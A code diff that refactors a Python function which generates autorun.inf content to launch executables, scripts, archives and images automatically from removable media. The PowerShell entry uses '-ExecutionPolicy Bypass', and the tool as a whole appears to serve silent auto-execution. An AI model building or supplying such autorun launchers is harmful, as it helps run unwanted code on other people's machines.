@@ -25,20 +25,20 @@ def generate_autorun_content(filename: str) -> str:
     file_type_actions = {
         ".exe": lambda f: f"[autorun]\nOpen={f}\nUseAutoPlay=1",
         ".zip": lambda f: f"[autorun]\nShellExecute=explorer.exe {f}\nUseAutoPlay=1",
-        (".jpg", ".jpeg", ".png", ".bmp", ".gif"): lambda f: f"[autorun]\nShellExecute={f}\nUseAutoPlay=1",
+        ".bat": lambda f: f"[autorun]\nShellExecute={f}\nUseAutoPlay=1",
         ".py": lambda f: f"[autorun]\nShellExecute=pythonw.exe {f}\nUseAutoPlay=1",
         ".jar": lambda f: f"[autorun]\nShellExecute=javaw.exe -jar {f}\nUseAutoPlay=1",
-        ".bat": lambda f: f"[autorun]\nShellExecute={f}\nUseAutoPlay=1",
         ".ps1": lambda f: f"[autorun]\nShellExecute=powershell.exe -ExecutionPolicy Bypass -File {f}\nUseAutoPlay=1"
     }
+    
+    # Image file extensions
+    image_extensions = (".jpg", ".jpeg", ".png", ".bmp", ".gif")
+    if ext.endswith(image_extensions):
+        return f"[autorun]\nShellExecute={filename}\nUseAutoPlay=1"
 
     # Check for exact match
-    for key, action in file_type_actions.items():
-        if isinstance(key, tuple):
-            if ext.endswith(key):
-                return action(filename)
-        elif ext.endswith(key):
-            return action(filename)
+    if ext in file_type_actions:
+        return file_type_actions[ext](filename)
     
     raise ValueError("Unsupported file type. Please use an executable, ZIP file, image, Python script, Java JAR, CMD batch file, or PowerShell script.")
 
